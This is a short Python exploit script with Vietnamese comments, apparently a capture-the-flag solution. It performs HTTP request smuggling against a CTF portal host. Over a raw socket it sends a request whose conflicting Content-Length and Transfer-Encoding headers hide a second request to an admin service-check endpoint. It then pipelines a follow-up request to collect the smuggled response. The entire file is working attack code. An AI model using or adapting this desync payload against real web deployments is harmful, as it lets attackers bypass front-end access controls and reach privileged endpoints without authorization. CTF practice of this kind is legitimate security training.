import socket
import time

TARGET_HOST = "portal.ctf-platform.chall.k1nd4sus.it"
TARGET_PORT = 80 

def send_smuggle():
    # Payload 1: The Smuggler (Độ dài JSON = 45, Hex = 8c)
    payload1 = (
        "POST /api/v1/auth/register HTTP/1.1\r\n"
        "Host: portal.ctf-platform.chall.k1nd4sus.it\r\n"
        "Content-Type: application/json\r\n"
        "Content-Length: 45\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "8c\r\n"
        "{\"username\":\"admin_p2\",\"password\":\"12345678\"}GET /api/v1/admin/service-check HTTP/1.1\r\n"
        "Host: portal.ctf-platform.chall.k1nd4sus.it\r\n"
        "X: X\r\n"
        "\r\n"
        "0\r\n"
        "\r\n\r\n"
    )

    # Payload 2: The Popper
    payload2 = (
        "GET / HTTP/1.1\r\n"
        "Host: portal.ctf-platform.chall.k1nd4sus.it\r\n"
        "Connection: close\r\n"
        "\r\n"
    )

    print("[*] Đang gửi Payload 1 và 2 trên CÙNG MỘT KẾT NỐI (Pipelining)...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((TARGET_HOST, TARGET_PORT))
        
        # Bắn liên thanh cả 2 payload trên cùng 1 socket
        s.sendall(payload1.encode())
        time.sleep(0.3) # Nghỉ một phần ba giây để đảm bảo Backend kịp đọc
        s.sendall(payload2.encode())

        print("[+] Đang nhận dữ liệu trả về...\n")
        print("-" * 50)
        
        # Nhận toàn bộ phản hồi
        response = s.recv(8192).decode()
        print(response)
        
        # Thử đọc thêm nếu dữ liệu bị tách làm 2 gói
        try:
            s.settimeout(2.0)
            response2 = s.recv(8192).decode()
            if response2:
                print(response2)
        except:
            pass
            
        print("-" * 50)

    except Exception as e:
        print(f"[-] Lỗi: {e}")
    finally:
        s.close()

if __name__ == "__main__":
    send_smuggle()